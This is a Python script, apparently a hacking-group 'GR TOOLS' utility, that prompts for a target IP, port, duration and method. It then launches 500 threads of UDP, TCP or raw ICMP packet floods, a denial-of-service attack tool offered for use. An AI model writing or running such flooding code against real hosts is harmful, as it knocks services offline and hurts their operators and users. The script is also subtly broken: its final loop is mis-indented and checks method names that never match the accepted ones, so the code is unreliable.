import os
import time
import threading
import socket
import random
import ctypes
import datetime
import sys

tampilan = """
░██████╗░██████╗   ░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
██╔════╝░██╔══██╗   ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
██║░░██╗░██████╔╝   ░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
██║░░╚██╗██╔══██╗   ░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
╚██████╔╝██║░░██║   ░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
░╚═════╝░╚═╝░░╚═╝   ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░
"""
print(tampilan)

ip = str(input("~GRC2@root Enter Target IP : "))
ip = socket.gethostbyname(ip)
port = int(input("~GRC2@root Enter Target PORT : "))
times = int(input("~GRC2@root Enter TIME : "))
method = str(input("~GRC2@root Enter METHOD :"))
os.system("clear")

expiration_date = datetime.datetime.now() + datetime.timedelta(days=1)

if method == "UDP" or method == "CPUKILL" or method == "TCP":
    print("VALID METHOD! ")
else:
    print("WRONG METHOD? TRY AGAIN")


def udpby():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, port))

    udpfloodl = random._urandom(10024)
    while datetime.datetime.now() < expiration_date:
        try:
            s.sendto(udpfloodl, (ip, port))
            for x in range(times):
                s.sendto(udpfloodl, (ip, port))
            print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method UDP Flood ")
        except socket.error:
            print(f"Error Cant Connecting | ip : {ip} port : {port}")
            s.close()


def cpukil():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.connect((ip, port))
    cpu = random._urandom(10024)
    while datetime.datetime.now() < expiration_date:
        try:
            s.sendto(cpu, (ip, port))
            for x in range(times):
                s.sendto(cpu, (ip, port))
            print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method {method} ")
        except socket.error:
            print(f"Error Cant Connecting | ip : {ip} port : {port}")
            s.close()


def tcpfl():
    grtools = random._urandom(10404)
    while datetime.datetime.now() < expiration_date:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(grtools)
            for x in range(times):
                sock.send(grtools)
            print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method TCP Flood ")
        except socket.error:
            print(f"Error Cant Connecting | ip : {ip} port : {port}")
            sock.close()


for x in range(500):
if method == "tcpfl":
        t = threading.Thread(target = tcpfl)
        t.start()
elif method == "udpby":
        t = threading.Thread(target = udpby)
        t.start()
